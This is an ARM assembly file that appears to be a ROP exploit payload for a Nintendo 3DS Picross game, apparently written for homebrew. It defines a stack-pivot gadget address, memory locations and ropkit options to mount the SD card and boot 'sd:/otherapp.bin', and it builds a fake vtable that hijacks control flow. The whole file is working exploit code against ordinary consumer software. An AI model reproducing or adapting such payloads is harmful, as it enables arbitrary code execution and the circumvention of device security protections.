	.arm
	.text
	
#include "../defines_pika.h"

#define GARBAGE 0xdeadb0b0
#define STACK_PIVOT 0x001C2C1C  
#define PIVOT_SP 0x0ffcd500   //not used
#define PIVOT_PC STACK_PIVOT  //not used (debug infinite loop)
#define SP_LINK 0x0014ce58

#define ROPBUF 0x003449c0     //bss location of rop payload (ropkit_boototherapp.s) that launches otherapp
#define ROPKIT_LINEARMEM_REGIONBASE 0x30000000
#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x1000000)

#define ROPKIT_BINPAYLOAD_PATH "sd:/otherapp.bin"
#define ROPKIT_MOUNTSD        //picross has sdmc access for some reason, so I'll just go ahead and use it :shrug:
#define ROPKIT_TMPDATA 0x0FFFc000
#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000
#define ROPKIT_ENABLETERMINATE_GSPTHREAD
#define ROPKIT_BEFOREJUMP_CACHEBUFADDR 0x30000000
#define ROPKIT_BEFOREJUMP_CACHEBUFSIZE 0x800000  //large gsgpu flush fixes our new3ds L2 cache issues - and increases stability for old3ds


#include "ropkit_ropinclude.s"

_start:
ropstackstart:

#include "ropkit_boototherapp.s"   //let yls8 voodoo code do its work :3

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACK_PIVOT @ Vtable